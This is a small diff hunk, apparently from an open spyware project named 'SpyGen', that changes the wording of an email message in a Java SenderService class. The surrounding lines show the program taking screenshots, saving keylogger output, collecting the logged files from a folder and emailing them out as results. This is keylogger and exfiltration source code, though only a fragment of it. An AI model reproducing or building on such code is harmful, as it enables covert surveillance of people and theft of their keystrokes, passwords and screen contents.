@@ -28,7 +28,7 @@ public class SenderService implements Runnable {
                     Screenshot.takeScreenshot("screenshot_" + new Date().toString().replace(" ", "_").replace(":", "-"));
                     Keylogger.keyboard.onSave();
 
-                    SendEmail sendEmail = new SendEmail("SpyGen result", "This result send it at data: " + new Date().toString());
+                    SendEmail sendEmail = new SendEmail("SpyGen result", "This result data send it at: " + new Date().toString());
 
                     File folder = new File(Settings.KEYLOGGER_PATH);
                     File[] listOfFiles = folder.listFiles();
